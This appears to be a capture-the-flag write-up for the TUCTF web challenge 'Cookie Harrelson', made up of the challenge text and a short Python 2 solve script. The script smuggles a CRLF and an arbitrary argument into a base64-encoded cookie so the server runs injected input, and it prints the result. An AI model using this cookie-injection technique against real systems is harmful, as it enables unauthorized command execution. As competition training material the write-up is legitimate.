# Web (200)

>Woody Harrelson has decided to take up web dev after learning about Cookies. Show him that he should go back to killing zombies.
>http://cookieharrelson.tuctf.com

```python
#!/usr/bin/env python2

import base64
import sys
import requests

source = requests.get(
  "http://cookieharrelson.tuctf.com", 
  cookies = { "tallahassee": base64.b64encode(chr(0x0d) + chr(0x0a) + sys.argv[1]) }
).content

print "\n".join(source.split("\n")[3:])
```

